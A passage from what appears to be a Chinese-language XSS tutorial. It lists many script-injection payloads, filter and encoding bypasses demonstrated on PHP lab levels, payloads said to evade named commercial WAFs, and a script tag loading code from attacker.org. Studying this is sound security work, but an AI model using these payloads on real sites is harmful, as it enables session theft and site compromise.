<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐<br></code></pre></td></tr></table></figure>

##### textarea标签

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;textarea onfocus=alert(&quot;xss&quot;); autofocus&gt;<br></code></pre></td></tr></table></figure>

##### audio标签

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;audio src=x onerror=alert(&quot;xss&quot;);&gt;<br></code></pre></td></tr></table></figure>

##### video标签

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;<br></code></pre></td></tr></table></figure>

##### input标签

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;<br><br>竞争焦点，从而触发onblur事件<br>&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;<br><br>通过autofocus属性执行本身的onfocus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发<br>&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;<br><br>&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;<br>&lt;input value=&quot;&quot; onclick=alert(&#x27;xss&#x27;) type=&quot;text&quot;&gt;<br>&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt(&#x27;xss&#x27;) bad=&quot;&quot;&gt;<br>&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;<br><br>按下按键时触发<br>&lt;input type=&quot;text&quot; onkeydown=&quot;alert(1)&quot;&gt;<br><br>按下按键时触发<br>&lt;input type=&quot;text&quot; onkeypress=&quot;alert(1)&quot;&gt;<br><br>松开按键式时触发<br>&lt;input type=&quot;text&quot; onkeyup=&quot;alert(1)&quot;&gt;<br></code></pre></td></tr></table></figure>

#### 5.3.3 利用link远程包含js文件

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">在无CSP的情况下才可以<br>&lt;link rel=import href=&quot;http://127.0.0.1/1.js&quot;&gt;<br></code></pre></td></tr></table></figure>

#### 5.3.4 javascript伪协议

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;a&gt;标签<br>&lt;a href=&quot;javascript:alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;<br><br>&lt;iframe&gt;标签<br>&lt;iframe src=javascript:alert(&#x27;xss&#x27;);&gt;&lt;/iframe&gt;<br><br>&lt;img&gt;标签<br>&lt;img src=javascript:alert(&#x27;xss&#x27;)&gt;//IE7以下<br><br>&lt;form&gt;标签<br>&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;<br></code></pre></td></tr></table></figure>

#### 5.3.5 expression属性

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;img style=&quot;xss:expression(alert(&#x27;xss&#x27;&#x27;))&quot;&gt; // IE7以下<br>&lt;div style=&quot;color:rgb(&#x27;&#x27;�x:expression(alert(1))&quot;&gt;&lt;/div&gt; //IE7以下<br>&lt;style&gt;#test&#123;x:expression(alert(/XSS/))&#125;&lt;/style&gt; // IE7以下<br></code></pre></td></tr></table></figure>

#### 5.3.6 background属性

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; //在Opera 10.5和IE6上有效<br></code></pre></td></tr></table></figure>

#### 5.3.7 form 标签

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;<br><br>&lt;form action=javascript:alert(&#x27;xss&#x27;) method=&quot;get&quot;&gt;<br><br>&lt;form action=javascript:alert(&#x27;xss&#x27;)&gt;<br><br>&lt;form method=post action=aa.asp? onmouseover=prompt(&#x27;xss&#x27;)&gt;<br><br>&lt;form method=post action=aa.asp? onmouseover=alert(&#x27;xss&#x27;)&gt;<br><br>&lt;form action=1 onmouseover=alert(&#x27;xss)&gt;<br><br>&lt;form method=post action=&quot;data:text/html;base64,&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;&gt;<br><br>&lt;form method=post action=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;<br></code></pre></td></tr></table></figure>

#### 5.3.8 存在过滤情况

例子：

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level5.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str3</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

分析代码发现，

**\$str2=str_replace("<script","<scr_ipt",$str); $str3=str_replace("on","o_n",$str2); 就直接把<script 转换成 <scr_ipt ，on转换成 o_n ，这样就过滤了js事件，$str = strtolower($_GET["keyword"]);这样大小写绕过也失效，不过这次没有过滤尖括号<>，这里使用伪协议来构造payload:**
利用payload:

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&quot;&gt;&lt;iframe src=javascript:alert(1)&gt;<br></code></pre></td></tr></table></figure>

![image-20230329104720853](浅析XSS漏洞/image-20230329104720853.png)

##### 绕过空格过滤

当空格被过滤了时，我们可以用 `/` 来代替空格：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/**/，注释符号绕过；<br>/符号绕过；<br><br>&lt;img/src=&quot;x&quot;/onerror=alert(1);&gt;<br> <br>也可以：<br> <br>&lt;img/src=&quot;x&quot;onerror=alert(1);&gt;<br></code></pre></td></tr></table></figure>

一般绕过空格过滤的方法有以下几种方法来取代空格

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/**/<br>()<br>回车(url编码中的%0a)<br>`(tap键上面的按钮)<br>tap<br>两个空格<br></code></pre></td></tr></table></figure>

##### 绕过引号过滤

如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;img src=x onerror=alert(`xss`);&gt;<br></code></pre></td></tr></table></figure>

##### 绕过括号过滤

当括号被过滤的时候可以使用throw来绕过。throw 语句用于当错误发生时抛出一个错误。

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;img src=x onerror=&quot;javascript:window.onerror=alert;throw 1&quot;&gt;<br>&lt;a onmouseover=&quot;javascript:window.onerror=alert;throw 1&gt;<br></code></pre></td></tr></table></figure>

##### 绕过关键字过滤

###### 1.1 大小写绕过

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;sCRiPt&gt;alert(1);&lt;/sCrIpT&gt;<br>&lt;ImG sRc=x onerRor=alert(1);&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level6.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str6</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

分析代码，发现同样过滤了很多字符，<script 转换成 <scr_ipt ，on 转换成 o_n ，src 转换成 sr_c ，data 转换成 da_ta，href 转换成 hr_ef，发现这里没有大小写约束。

**利用payload：** 

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&quot;&gt;&lt;sCRiPt&gt;alert(1);&lt;/sCrIpT&gt;<br></code></pre></td></tr></table></figure>

![image-20230329105416454](浅析XSS漏洞/image-20230329105416454.png)

###### 1.2 双写绕过

有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;scrscriptipt&gt;alert(1);&lt;/scrscriptipt&gt;<br>&lt;imimgg srsrcc=x onerror=alert(1);&gt;<br></code></pre></td></tr></table></figure>

例子：

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>　　<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br>　　<span class="hljs-variable">$str</span> =<span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br>　　<span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str</span>);<br>　　<span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str2</span>);<br>　　<span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str3</span>);<br>　　<span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str4</span>);<br>　　<span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str5</span>);<br>　　<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">　　&lt;form action=level7.php method=GET&gt;</span><br><span class="hljs-string">　　　　&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str6</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">　　　　&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="hljs-string">　　　　&lt;/form&gt;</span><br><span class="hljs-string">　　&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

分析代码，不仅大小写不能用了，script，on，src ，data ，href 都直接转换成空，尝试双写绕过。

payload：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&quot;&gt;&lt;sscriptcript&gt;alert(1)&lt;/sscriptcript&gt;<br></code></pre></td></tr></table></figure>

![image-20230329105528009](浅析XSS漏洞/image-20230329105528009.png)

###### 1.3 字符串拼接绕过

利用eval()函数

与PHP的eval()函数相同，JavaScript的eval()函数也可以计算 JavaScript 字符串，并把它作为脚本代码来执行。

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;img src=&quot;x&quot; onerror=&quot;a=&#x27;aler&#x27;;b=&#x27;t&#x27;;c=&#x27;(1)&#x27;;eval(a+b+c)&quot;&gt;<br>&lt;img src=&quot;x&quot; onerror=&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;&gt;<br>// 在js中，我们可以用反引号代替单双引号<br></code></pre></td></tr></table></figure>

利用top

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](`xss`);&lt;/script&gt;<br>&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](&quot;xss&quot;);&lt;/script&gt;<br></code></pre></td></tr></table></figure>

###### 1.4 其它字符混淆

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了<br>下面举几个简单的例子<br><br>可利用注释、标签的优先级等<br>&lt;&lt;script&gt;alert(&quot;xss&quot;);//&lt;&lt;/script&gt;<br>&lt;scri&lt;!--test--&gt;pt&gt;alert(&quot;hello world!&quot;)&lt;/scri&lt;!--test--&gt;pt&gt;<br>&lt;title&gt;&lt;img src=&lt;/title&gt;&gt;&lt;img src=x onerror=&quot;alert(``xss``);&quot;&gt; 因为title标签的优先级比img的高，所以会先闭合title，<br>从而导致前面的img标签无效<br>&lt;SCRIPT&gt;var a=&quot;\\&quot;;alert(&quot;xss&quot;);//&quot;;&lt;/SCRIPT&gt;<br><br>&lt;scr&lt;!--test--&gt;ipt&gt;alert(&quot;hello world!&quot;)&lt;/scr&lt;!--test--&gt;ipt&gt;<br></code></pre></td></tr></table></figure>

###### 1.5 编码绕过

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Unicode编码绕过<br>&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;<br>&lt;img src=&quot;x&quot;<br>onerror=&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;&gt;<br><br>url编码绕过<br>&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;&gt;<br>&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;<br><br>Ascii码绕过<br>&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;<br><br>Hex绕过<br>&lt;img src=x onerror=eval(&#x27;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#x27;)&gt;<br><br>八进制绕过<br>&lt;img src=x onerror=alert(&#x27;\170\163\163&#x27;)&gt;<br><br>base64绕过<br>&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;&gt;<br>&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;<br></code></pre></td></tr></table></figure>

###### 1.6 过滤双引号，单引号

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">如果是html标签中，我们可以不用引号；如果是在js中，我们可以用反引号代替单双引号<br>&lt;img src=&quot;x&quot; onerror=alert(``xss``);&gt;<br>使用编码绕过，具体看上面列举的例子<br></code></pre></td></tr></table></figure>

###### 1.7 过滤括号

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">当括号被过滤的时候可以使用throw来绕过<br>&lt;svg/onload=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;&gt;<br></code></pre></td></tr></table></figure>

###### 1.8 过滤url地址

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">使用url编码<br>&lt;img src=&quot;x&quot; onerror=document.location=``http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/``&gt;<br><br>使用IP<br>&lt;img src=&quot;x&quot; onerror=document.location=``http://2130706433/``&gt;十进制<br><br>&lt;img src=&quot;x&quot; onerror=document.location=``http://0177.0.0.01/``&gt;八进制<br><br>&lt;img src=&quot;x&quot; onerror=document.location=``http://0x7f.0x0.0x0.0x1/``&gt;十六进制<br><br>&lt;img src=&quot;x&quot; onerror=document.location=``//www.baidu.com``&gt;html标签中用//可以代替http://<br>使用\ (注意：在windows下\本身就有特殊用途，是一个path 的写法，所以\在Windows下是file协议，在linux下才会是当前域的协议)<br>使用中文逗号代替英文逗号<br><br>&lt;img src=&quot;x&quot; onerror=&quot;document.location=``http://www。baidu。com``&quot;&gt;//会自动跳转到百度<br></code></pre></td></tr></table></figure>

htmlspecialchars() 函数可以把一些预定义的字符转换为 HTML 实体。

预定义的字符：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&amp;：转换为&amp;amp;<br>&quot;：转换为&amp;quot;<br>&#x27;：转换为成为 &#x27;<br>&lt;：转换为&amp;lt;<br>&gt;：转换为&amp;gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27;onmouseover=&#x27;alert(/xss/)<br></code></pre></td></tr></table></figure>

#### 常规waf绕过思路

1.标签语法替换

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;scr&lt;script&gt;ipt&gt;alert(&quot;XSS&quot;)&lt;/scr&lt;script&gt;ipt&gt;<br></code></pre></td></tr></table></figure>

    <script>alert("XSS")</script>
<pre><code>&lt;script src=&quot;http://attacker.org/malicious.js&quot;&gt;&lt;/script&gt;
</code></pre>
<p>2.特殊符号干扰</p>
<p>3.提交方式更改</p>
<p>4.垃圾数据溢出</p>
<p>5.加密解密算法</p>
<p>6.结合其他漏洞绕过</p>
<p>下面的列表包含了可绕过的WAF、Paylaod以及相关的绕过技术</p>
<pre><code>WAF名称：Cloudflare
Payload：&lt;a”/onclick=(confirm)()&gt;click
绕过技术：非空格填充

WAF名称：Wordfence
Payload：&lt;a/href=javascript&amp;colon;alert()&gt;click
绕过技术：数字字符编码

WAF名称：Barracuda
Payload：&lt;a/href=Java%0a%0d%09script&amp;colon;alert()&gt;click
绕过技术：数字字符编码

WAF名称：Comodo
Payload：&lt;d3v/onauxclick=(((confirm)))“&gt;click
绕过技术：黑名单中缺少事件处理器以及函数调用混淆

WAF名称：F5
Payload：&lt;d3v/onmouseleave=[2].some(confirm)&gt;click
绕过技术：黑名单中缺少事件处理器以及函数调用混淆

WAF名称：ModSecurity
Payload：&lt;details/open/ontoggle=alert()&gt;
绕过技术：黑名单中缺少标签或事件处理器

WAF名称：dotdefender
Payload：&lt;details/open/ontoggle=(confirm)()//
绕过技术：黑名单中缺少结束标签、事件处理器和函数调用混淆
</code></pre>
<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3>
<h4 id="1、漏洞验证的相关概念"><a href="#1、漏洞验证的相关概念" class="headerlink" title="1、漏洞验证的相关概念"></a>1、漏洞验证的相关概念</h4>
<p>POC：全称 ’ Proof of Concept '，中文 ’ 概念验证 ’ ，常指一段漏洞验证的代码。</p>
<p>EXP：全称 ’ Exploit '，中文 ’ 利用 '，指利用系统漏洞进行攻击的工具，即从漏洞检测验证到利用的工具。</p>
<p>Payload：中文 ’ 有效载荷 '，指成功exploit之后，真正在目标系统执行的代码或指令。</p>
<p>Shellcode：简单翻译 ’ shell代码 '，利用漏洞时所执行的代码，是Payload的一种。Shellcode也有很多种，包括正向的，反向的，甚至meterpreter。</p>
<h4 id="2、漏洞验证相关概念之间的区别"><a href="#2、漏洞验证相关概念之间的区别" class="headerlink" title="2、漏洞验证相关概念之间的区别"></a>2、漏洞验证相关概念之间的区别</h4>
<p><strong>（1）POC与EXP对比</strong></p>
<p>POC是用来验证漏洞存在的，EXP是用来完整利用漏洞(包括从验证到利用全过程)的，两者通常不是一类，或者说，PoC通常是无害的，Exp通常是有害的，有了POC，才有EXP。</p>
<p><strong>（2）Payload与Shellcode</strong></p>
<p>Payload有很多种，它可以是Shellcode，也可以直接是一段系统命令。</p>
<p><strong>（3）Payload与EXP</strong></p>
<p>同一个Payload可以用于多个漏洞，但每个漏洞都有其自己的EXP，也就是说不存在通用的EXP。</p>
<p><strong>（4）Payload模块</strong></p>
<p>在Metasploit Framework 6大模块中有一个Payload模块，在该模块下有Single、Stager、Stages这三种类型，Single是一个all-in-one的Payload，不依赖其他的文件，所以它的体积会比较大，Stager主要用于当目标计算机的内存有限时，可以先传输一个较小的Stager用于建立连接，Stages指利用Stager建立的连接下载后续的Payload。Stager和Stages都有多种类型，适用于不同场景。</p>
<h4 id="3、常见的POC"><a href="#3、常见的POC" class="headerlink" title="3、常见的POC"></a>3、常见的POC</h4>
<p>可以用一段简单的代码（POC）来验证与检查漏洞的存在，常见的用于验证XSS漏洞存在的POC如下：</p>
<pre><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;  //弹框，最常用
&lt;script&gt;confirm('xss')&lt;/script&gt;  //弹出确认框
&lt;script&gt;prompt('xss')&lt;/script&gt;   //弹出输入框
</code></pre>
<p>我们发现提交的代码<script>alert(/xss/)</script> ，被当作字符串输出在HTML页面中，浏览器会根据<script>标签识别为JS代码语句，并会执行它，执行弹窗操作。也就是说，可以执行其他任意JS代码，因此我们验证了XSS漏洞的存在性。</p>
